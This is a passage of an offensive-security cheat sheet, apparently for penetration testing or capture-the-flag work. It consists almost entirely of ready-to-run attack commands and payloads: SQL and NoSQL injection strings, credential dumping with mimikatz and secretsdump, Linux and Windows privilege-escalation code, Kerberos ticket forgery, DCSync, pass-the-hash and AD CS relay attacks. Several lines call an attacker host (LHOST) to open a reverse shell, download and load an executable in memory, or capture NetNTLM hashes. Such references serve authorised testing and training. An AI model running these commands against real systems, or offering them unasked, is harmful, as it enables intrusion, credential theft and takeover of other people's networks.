./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER              # dump exposed .git directory
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/                 # reconstruct source from dumped git objects
```

---

### Database Analysis

#### MySQL

```bash
mysql -u root -p                                                  # connect to local MySQL as root
mysql -u <USERNAME> -h <RHOST> -p                                # connect to remote MySQL
```

```sql
SHOW databases;
USE <DATABASE>;
SHOW tables;
SELECT * FROM users \G;
SELECT LOAD_FILE('/etc/passwd');
SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' LINES TERMINATED BY '\n';
\! /bin/sh                          -- drop shell
```

#### MSSQL

```bash
impacket-mssqlclient <USERNAME>@<RHOST>                          # connect to MSSQL with Impacket
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth            # connect to MSSQL with Windows auth
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'                   # connect to MSSQL with sqlcmd
```

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;

-- xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Steal NetNTLM
exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'

-- List files
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

#### PostgreSQL

```bash
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>              # connect to PostgreSQL database
```

```sql
\list           -- list databases
\c <DATABASE>   -- use database
\dt             -- list tables
\du             -- list users
SELECT usename, passwd from pg_shadow;

-- RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

#### MongoDB

```bash
mongo "mongodb://localhost:27017"                                # connect to local MongoDB
```

```
use <DATABASE>;
show collections;
db.users.find();
db.getUsers({showCredentials: true});
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

#### Redis

```bash
redis-cli -h <RHOST>                                             # connect to Redis
AUTH <PASSWORD>                                                  # authenticate to Redis
CONFIG GET *                                                     # dump Redis configuration
KEYS *                                                           # list Redis keys
GET PHPREDIS_SESSION:<SESSION_ID>                                # read PHP session value

# Write SSH key
echo "FLUSHALL" | redis-cli -h <RHOST>                           # clear Redis keys before writing payload key
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt    # wrap SSH public key with newlines
cat /tmp/key.txt | redis-cli -h <RHOST> -x set s-key              # store SSH public key in Redis
redis-cli -h <RHOST>                                             # reconnect to Redis for config writes
> CONFIG SET dir /var/lib/redis/.ssh                             # set Redis write directory to SSH folder
> CONFIG SET dbfilename authorized_keys                          # write database as authorized_keys
> save                                                           # force Redis to write file
```

#### sqlite3

```bash
sqlite3 <FILE>.db                                                # open SQLite database
.tables                                                          # list SQLite tables
PRAGMA table_info(<TABLE>);                                      # show SQLite table schema
SELECT * FROM <TABLE>;                                           # dump SQLite table rows
```

#### SQL Injection

##### Authentication Bypass
```sql
admin' or '1'='1
' or 1=1 limit 1 -- -+
'-'
' or true--
admin' --
```

##### MySQL Union-based
```sql
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
-1 union select 1,2,version();#
-1 union select 1,2,database();#
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

##### Blind SQLi
```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

##### NoSQL Injection
```
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null}}
```

---

### Password Attacks

#### hashcat

```bash
hashcat -m 0    md5hash /PATH/TO/WORDLIST                        # crack MD5 hash
hashcat -m 100  sha1hash /PATH/TO/WORDLIST                       # crack SHA1 hash
hashcat -m 1000 ntlmhash /PATH/TO/WORDLIST                       # crack NTLM hash
hashcat -m 1800 sha512hash /PATH/TO/WORDLIST                     # crack SHA512-crypt hash
hashcat -m 13100 kerberoast_hashes /PATH/TO/WORDLIST             # crack Kerberoast hash
hashcat -m 18200 asreproast_hashes /PATH/TO/WORDLIST             # crack AS-REP roast hash
hashcat -m 5600  netntlmv2 /PATH/TO/WORDLIST                     # crack NetNTLMv2 hash
hashcat -m 3200  bcrypt /PATH/TO/WORDLIST                        # crack bcrypt hash

# With rules
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule    # crack NTLM with rule mutations
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule                    # crack bcrypt with custom rules

# Custom rules
echo \$1 > custom.rule           # append 1
echo 'c' >> custom.rule          # capitalize first
hashcat -r custom.rule --stdout wordlist.txt   # preview

# Identify hash type
hashcat --identify --user <FILE>                                  # identify hash mode from file

# OpenSSH key
openssl pkcs8 -in id_rsa -outform DER -out key.der -nocrypt       # convert OpenSSH key for cracking
hashcat -m 16200 key.der /PATH/TO/WORDLIST                        # crack OpenSSH private key
```

#### John

```bash
keepass2john <FILE>                                               # extract KeePass hash for John
ssh2john id_rsa > <FILE>                                          # extract SSH key hash for John
zip2john <FILE> > <FILE>                                          # extract ZIP hash for John
john <FILE> --wordlist=/PATH/TO/WORDLIST --format=crypt           # crack hash with wordlist
john --show <FILE>                                                # show cracked credentials
```

#### Hydra

```bash
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST <PROTOCOL>       # brute force one user against a service
hydra <RHOST> -L users.txt -P passwords.txt <PROTOCOL>            # brute force users and passwords
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"    # brute force HTTP form
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/index.php:username=user&password=^PASS^:Login failed"    # brute force known HTTP user
hydra -L users.txt -p <PASSWORD> -m workgroup:{<DOMAIN>} <RHOST> smb2    # password spray SMB2
```

#### fcrack (ZIP)

```bash
fcrackzip -u -D -p /PATH/TO/WORDLIST <FILE>.zip                   # crack ZIP password with dictionary
```

#### mimikatz

```bash
privilege::debug                                                 # enable debug privilege
sekurlsa::logonpasswords                                         # dump logon credentials
sekurlsa::tickets /export                                        # export Kerberos tickets
lsadump::sam                                                     # dump local SAM hashes
lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>           # DCSync krbtgt account
kerberos::golden /user:Administrator /domain:... /sid:... /krbtgt:<HASH> /id:500    # forge golden ticket
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi    # pass ticket into session
token::elevate                                                   # impersonate elevated token
vault::cred                                                      # dump Windows Vault credentials
vault::list                                                      # list Windows Vault entries
```

#### pypykatz

```bash
pypykatz lsa minidump lsass.dmp                                  # parse LSASS minidump offline
pypykatz registry --sam sam system                               # parse SAM/SYSTEM hives offline
```

#### Group Policy Preferences (GPP)

```bash
python3 gpp-decrypt.py -f Groups.xml                             # decrypt GPP cpassword from XML
python3 gpp-decrypt.py -c <CPASSWORD>                             # decrypt raw GPP cpassword
```

#### DonPAPI

```bash
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>                   # collect DPAPI/browser secrets remotely
DonPAPI -local_auth <USERNAME>@<RHOST>                            # collect secrets with local auth
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>            # collect secrets using NTLM hash
```

#### Kerbrute

```bash
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES -t 50    # enumerate valid AD users
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES <PASSWORD>    # spray one password over users
```

#### LaZagne

```bash
laZagne.exe all                                                   # dump locally stored credentials
```

---

### Exploitation Tools

#### Metasploit

```bash
sudo msfdb run                                                   # start Metasploit with database support
msf6 > workspace -a <WORKSPACE>                                  # create or switch to a workspace
msf6 > db_nmap <OPTIONS>                                         # run nmap and import results into the database
msf6 > use exploit/multi/handler                                 # configure a generic payload listener
msf6 > set payload windows/x64/meterpreter/reverse_tcp           # choose a Windows x64 Meterpreter reverse payload
msf6 > set LHOST <LHOST>                                         # set callback IP
msf6 > set LPORT <LPORT>                                         # set callback port
msf6 > run                                                       # start the handler or selected module

# Meterpreter
meterpreter > getuid                                             # show current user context
meterpreter > getsystem                                          # attempt local privilege escalation to SYSTEM
meterpreter > hashdump                                           # dump local SAM hashes
meterpreter > load kiwi                                          # load Mimikatz extension
meterpreter > creds_all                                          # dump credentials with kiwi
meterpreter > lsa_dump_sam                                       # dump SAM secrets with kiwi
meterpreter > run post/multi/recon/local_exploit_suggester       # suggest local privesc modules
meterpreter > run post/windows/manage/enable_rdp                 # enable RDP on target
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1     # forward a remote port through session
meterpreter > sessions -u <ID>                                   # upgrade shell session to Meterpreter
```

Payload generation lives in [Msfvenom](#msfvenom).

---

### Post Exploitation

#### Linux Enumeration

```bash
id && sudo -l && env                                             # show user, sudo rights, and environment
cat ~/.bashrc                                                    # inspect shell startup commands
cat /etc/passwd /etc/hosts /etc/fstab /etc/crontab               # review users, hosts, mounts, and cron
lsblk && ss -tulpn && ps -auxf                                   # list disks, listeners, and processes
ls -lahv /opt /home                                              # inspect common app and user directories
find / -perm -4000 2>/dev/null | xargs ls -la                   # SUID binaries
find / -type f -perm /4000 2>/dev/null                           # find files with any SUID bit set
find / -type f -user root -perm -4000 2>/dev/null                # find root-owned SUID files
find / -writable -type d 2>/dev/null                             # find writable directories
find / -cmin -60 2>/dev/null                                     # changed in last 60 min
find ./ -type f -exec grep --color=always -i -I 'password' {} \; # search local files for passwords
getfacl <LOCAL_DIRECTORY>                                        # show file ACLs
/usr/share/peass/linpeas.sh                                      # run LinPEAS enumeration
```

#### Linux Privilege Escalation

##### Sudo Bypass

```bash
# LD_PRELOAD
# shell.c:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }

gcc -o shell.so shell.c -shared -FPIC -nostartfiles              # compile LD_PRELOAD shared object
sudo LD_PRELOAD=/path/to/shell.so <BINARY>                       # run sudo binary with injected library
```

##### SUID Abuse

```bash
find / -perm -u=s -type f 2>/dev/null                            # find SUID binaries
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"            # abuse SUID PHP for root shell
sudo /usr/sbin/apache2 -f <FILE>                                 # read first line as root
```

##### Capabilities

```bash
capsh --print                                                    # show current Linux capabilities
/usr/sbin/getcap -r / 2>/dev/null                                # find files with capabilities
```

##### Wildcard Abuse

```bash
touch -- --checkpoint=1                                          # create tar checkpoint option file
touch -- '--checkpoint-action=exec=sh shell.sh'                  # create tar checkpoint command file
```

##### Writable /etc/passwd

```bash
openssl passwd <PASSWORD>                                        # generate passwd-compatible hash
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd    # add root-equivalent user
su root2                                                         # switch to injected root user
```

##### Shared Library Misconfiguration

```bash
ldd /PATH/TO/BINARY                                              # inspect shared library dependencies
# shell.c: #include <stdlib.h> ... void _init() { setuid(0); setgid(0); system("/bin/bash -i"); }
gcc -shared -fPIC -nostartfiles -o <LIBRARY>.so <FILE>.c         # compile malicious shared library
sudo LD_LIBRARY_PATH=/path/to/lib <BINARY>                       # run binary with controlled library path
```

##### logrotten (Log Rotation Exploit)

```bash
./logrotten -p ./payloadfile /tmp/log/pwnme.log                  # exploit writable logrotate target
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log    # if compress option set
```

##### rbash Breakouts

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin    # restore common PATH
less /etc/profile → !/bin/sh                                      # break out from less
vi -c ':!/bin/sh' /dev/null                                       # break out from vi
ssh <USERNAME>@<RHOST> -t sh                                      # force non-rbash shell over SSH
```

##### Writable Directories

```
/dev/shm
/tmp
```

#### Windows Enumeration

```powershell
whoami /all                                                       # show user privileges and groups
systeminfo                                                       # show OS, patch, and domain info
net accounts && net user && net user /domain                     # enumerate account policy and users
Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember <GROUP>      # enumerate local users and groups
Get-Service                                                      # list services
Get-Process                                                      # list running processes
tree /f C:\Users\                                                # list user profile files
tasklist /SVC                                                    # map processes to services
sc query                                                         # query service states
schtasks /query /fo LIST /v                                      # list scheduled tasks verbosely
$ts = New-Object -ComObject Schedule.Service; $ts.Connect(); $ts.GetFolder('<TASK_FOLDER>').GetTask('<TASK_NAME>').Definition | Format-List *    # scheduled task definition
wmic qfe get Caption,Description,HotFixID,InstalledOn            # list installed hotfixes
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    # check Winlogon secrets

# Hidden files
dir /a && dir /a:h && powershell ls -force                       # reveal hidden files

# Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname    # list installed 32-bit apps
```

#### .NET Binary Analysis

```bash
monodis --output=<OUTPUT>.il <ASSEMBLY>.exe                                      # disassemble .NET assembly to IL for review
ilspycmd -p -o <OUTPUT_DIR> <ASSEMBLY>.exe                                       # decompile .NET assembly to C# project
```

#### Windows Credential Harvesting

```powershell
cmdkey /list                                                     # list saved Windows credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    # check autologon credentials
reg query HKLM /f password /t REG_SZ /s                          # search machine registry for passwords
reg query HKCU /f password /t REG_SZ /s                          # search user registry for passwords

# PowerShell history
(Get-PSReadlineOption).HistorySavePath                           # show PowerShell history path
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt    # read PowerShell history

# Find passwords
findstr /si password *.xml *.ini *.txt                           # search common text files for passwords
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue    # find KeePass databases
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue    # find user documents

# Dump hashes
reg save hklm\system system.hive                                 # save SYSTEM hive
reg save hklm\sam sam.hive                                       # save SAM hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # dump local hashes from hives
```

#### Windows Privilege Escalation

##### AlwaysInstallElevated

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer     # check current-user AlwaysInstallElevated policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer     # check local-machine AlwaysInstallElevated policy
msiexec /quiet /qn /i <PAYLOAD>.msi                              # silently install MSI payload if both keys are enabled
```

##### DLL Hijacking

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}    # list running service paths
icacls .\PATH\TO\BINARY\<BINARY>.exe                            # check binary permissions

# customdll.cpp:
# int main() { system("net user <USERNAME> <PASSWORD> /add"); system("net localgroup administrators <USERNAME> /add"); }
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll   # compile malicious DLL
Restart-Service <SERVICE>                                        # restart service to load DLL
```

##### Unquoted Service Paths

```bash
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """        # find unquoted service paths outside Windows
icacls "C:\"                                                                              # check root directory write permissions
icacls "C:\Program Files"                                                                 # check Program Files write permissions
# Drop malicious exe in writable path segment, restart service
Start-Service <SERVICE>                                                                   # restart service to trigger path hijack
```

##### SeBackupPrivilege

```bash
reg save hklm\system C:\Users\<USERNAME>\system.hive             # copy SYSTEM hive with backup privilege
reg save hklm\sam C:\Users\<USERNAME>\sam.hive                   # copy SAM hive with backup privilege
impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # extract hashes from copied hives

# diskshadow method for ntds.dit
diskshadow /s script.txt                                         # create shadow copy from script
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit    # copy ntds.dit with backup privilege
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL    # dump domain hashes offline
```

##### SeImpersonate / SeAssignPrimaryToken

```bash
.\RogueWinRM.exe -p "C:\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"    # abuse WinRM impersonation for shell
.\GodPotato-NET4.exe -cmd '<COMMAND>'                            # run command via GodPotato
.\PrintSpoofer64.exe -i -c powershell                            # spawn SYSTEM PowerShell via PrintSpoofer
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"    # test JuicyPotatoNG execution
```

##### SeTakeOwnershipPrivilege

```bash
takeown /f C:\Windows\System32\Utilman.exe                       # take ownership of Utilman
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F         # grant write access to Utilman
copy cmd.exe utilman.exe       # click Ease of Access on logon screen for SYSTEM shell
```

##### writeDACL

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force    # convert password to secure string
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)    # build domain credential
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync    # grant DCSync rights
```

##### Enable RDP / WinRM

```powershell
# RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f    # enable RDP logons
netsh advfirewall firewall set rule group="remote desktop" new enable=yes    # allow RDP firewall rules

# WinRM
winrm quickconfig                                                 # enable WinRM listener
```

#### PowerShell Tricks

```powershell
Set-ExecutionPolicy remotesigned                                  # allow locally created scripts
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1    # run script with policy bypass
Import-Module .\<FILE>                                            # import PowerShell module

# Switching user context
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force    # convert plaintext password
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)    # build credential object
Enter-PSSession -ComputerName <RHOST> -Credential $cred           # start remote PowerShell session

# Execute remote commands as another user
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force   # convert domain password
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)    # build domain credential
Invoke-Command -computername <COMPUTERNAME> -Credential $cred -command {whoami}    # run remote command as user

# .NET Reflection
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing).Content    # download assembly bytes
$assembly = [System.Reflection.Assembly]::Load($bytes)             # load assembly in memory

# Base64 encode command
$Text = 'IEX(...)'                                                # define PowerShell payload text
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)          # encode payload as UTF-16LE bytes
$EncodedText = [Convert]::ToBase64String($Bytes)                  # base64 encode payload
powershell -nop -w hidden -e $EncodedText                         # execute encoded PowerShell payload
```

#### Active Directory

##### Manual Enumeration

```powershell
net user /domain                                                  # list domain users
net group /domain                                                 # list domain groups
net group "<GROUP>" /domain                                      # list domain group members
Get-NetDomain                                                     # show current AD domain
Get-NetUser | select cn,pwdlastset,lastlogon                      # list users with password and logon fields
Get-NetGroup | select cn                                          # list domain groups
Get-NetGroup "<GROUP>" | select member                            # list group members
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion    # list domain computers
Find-LocalAdminAccess                                             # find machines where current user is local admin
Get-NetSession -ComputerName <RHOST>                              # list sessions on remote host
Convert-SidToName S-1-5-21-...                                    # resolve SID to name
```

##### Object Permission Enumeration

| Permission | Description |
| --- | --- |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes |
| WriteOwner | Change ownership |
| WriteDACL | Edit ACEs |
| AllExtendedRights | Change/reset password |
| ForceChangePassword | Password change |
| Self (Self-Membership) | Add self to group |

```powershell
Get-ObjectAcl -Identity <USERNAME>                                # enumerate object ACLs
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights    # find GenericAll rights
```

##### AS-REP Roasting

```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast    # unauthenticated AS-REP roast users
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile hashes.asreproast    # authenticated AS-REP roast
.\Rubeus.exe asreproast /nowrap                                  # AS-REP roast from Windows
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule    # crack AS-REP hashes
```

##### Kerberoasting

```bash
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request    # request Kerberoast tickets
faketime 'now + 8 hours' impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-host <FQDN>    # Kerberoast with time skew
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast               # Kerberoast from Windows
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule    # crack Kerberoast hashes
```

##### Silver Tickets

```bash
# Gather: NTLM of service account, Domain SID, Target SPN
iwr -UseDefaultCredentials http://<RHOST>                         # test default credentials to service
mimikatz # sekurlsa::logonpasswords
whoami /user                                                      # capture current user SID
mimikatz # kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:<NTLM> /user:<USERNAME>
klist                                                            # confirm injected silver ticket
```

##### Golden Tickets

```bash
mimikatz # lsadump::lsa /patch                    # get krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt
.\PsExec.exe \\<RHOST> cmd                        # use hostname, not IP
```

##### DCSync

```bash
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator          # DCSync Administrator with Mimikatz
impacket-secretsdump -just-dc-user Administrator <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>    # DCSync one user with Impacket
```

##### Pass the Hash

```bash
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<RHOST>      # pass-the-hash with WMIExec
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes <LM_HASH>:<NTLM_HASH>    # pass-the-hash with PsExec
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard    # pass-the-hash with RDP
```

##### Lateral Movement

```powershell
# WMI
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"    # create remote process with WMI

# WinRS
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"    # execute remote command with WinRS
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e <B64>"    # launch encoded remote PowerShell

# PSExec
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd    # interactive remote cmd with PsExec
```

##### Volume Shadow Copy (ntds.dit)

```bash
vshadow.exe -nw -p C:                                               # create C: volume shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak    # copy ntds.dit from shadow copy
reg.exe save hklm\system C:\system.bak                              # save SYSTEM hive
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL    # dump domain hashes offline
```

#### AD CS (Active Directory Certificate Services)

```bash
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout    # enumerate vulnerable AD CS templates
```

| ESC | Technique |
| --- | --- |
| ESC1 | Misconfigured template — enroll with alt UPN |
| ESC2 | Any Purpose EKU abuse |
| ESC3 | Enrollment agent template |
| ESC4 | Writable template ACL |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA |
| ESC7 | Vulnerable CA ACL |
| ESC8 | NTLM relay to AD CS HTTP |
| ESC9 | No security extensions |
| ESC10 | Weak certificate mappings |

```bash
# ESC1
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>    # request cert with alternate UPN
certipy auth -pfx administrator.pfx -dc-ip <RHOST>                # authenticate with issued certificate

# ESC8 - NTLM Relay
certipy relay -target 'http://<CA>'                               # relay NTLM to AD CS HTTP endpoint
python3 PetitPotam.py <RHOST> <DOMAIN>                            # coerce machine authentication
certipy auth -pfx dc.pfx -dc-ip <RHOST>                           # authenticate as machine with PFX
export KRB5CCNAME=dc.ccache                                       # use machine Kerberos cache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>          # dump secrets with machine ticket

# CSR / certificate handling
openssl req -new -newkey rsa:2048 -nodes -keyout <CERT>.key -out <CERT>.csr -subj "/CN=<FQDN>" -addext "subjectAltName=DNS:<FQDN>"    # generate key and CSR with SAN
certreq -submit -config "<CA_HOST>\<CA_NAME>" -attrib "CertificateTemplate:<TEMPLATE>" <CERT>.csr <CERT>.cer    # submit CSR to AD CS
openssl pkcs12 -export -inkey <CERT>.key -in <CERT>.cer -out <CERT>.pfx    # bundle cert and key as PFX
openssl pkcs12 -in <CERT>.pfx -out <CERT>.crt -clcerts -nokeys -passin pass:'<PASSWORD>'    # extract certificate from PFX
openssl pkcs12 -in <CERT>.pfx -out <CERT>.key -nocerts -nodes -passin pass:'<PASSWORD>'    # extract private key from PFX
```

#### BloodHound

```bash
# Setup
sudo neo4j console                                                # start Neo4j database
bloodhound                                                       # launch BloodHound GUI

# Collection
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip    # collect BloodHound data with password
KRB5CCNAME=user.name.ccache faketime 'now + 8 hours' bloodhound-python -k -u user.name -d FQDN -c All -ns <IP> --disable-autogc    # collect with Kerberos ticket

# Kerberos time skew
faketime 'now + 8 hours' bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DOMAIN> -c all --disable-autogc    # collect while offsetting clock
```

#### NetExec

```bash
# SMB
netexec smb <RHOST> -u '' -p '' --pass-pol                                                      # password policy
netexec smb <RHOST> -u '' -p '' --shares                                                        # list SMB shares anonymously
netexec smb <RHOST> -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'         # RID brute valid users
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                                        # dump SAM hashes
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                                        # dump LSA secrets
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds                                       # dump NTDS hashes
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                                    # dump LSASS with lsassy module
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                                      # execute command with NTLM hash

# LDAP
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users                             # active AD users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting       # collect Kerberoast hashes
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast             # collect AS-REP roast hashes
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server '<IP>' --bloodhound -c All    # collect BloodHound data
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq                                     # MachineAccountQuota lets users add domain computers.

# WinRM
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d .                                      # test WinRM credentials
netexec winrm <RHOST> -d <DOMAIN> -u users -p passwords --continue-on-success                   # Password spray

# SSH
nxc ssh <RHOSTS> -u userfile -p passwordfile --no-bruteforce                                    # test user/password pairs over SSH
```

#### Evil-WinRM

```bash
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>               # open WinRM shell with password
evil-winrm -i <RHOST> -c /PATH/TO/<CERT>.crt -k /PATH/TO/<KEY>.key -u <USERNAME> -S    # open WinRM shell with certificate
evil-winrm -i <RHOST> -r <REALM>                                # open WinRM shell using Kerberos realm
```

#### Impacket Reference

```bash
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/               # enumerate AD users
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>    # AS-REP roast without password
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request    # Kerberoast SPNs
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>       # enumerate SIDs and users
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>                # dump remote secrets
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL    # dump local hives offline
impacket-psexec <USERNAME>@<RHOST>                              # execute shell with PsExec
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass         # execute shell with Kerberos WMI
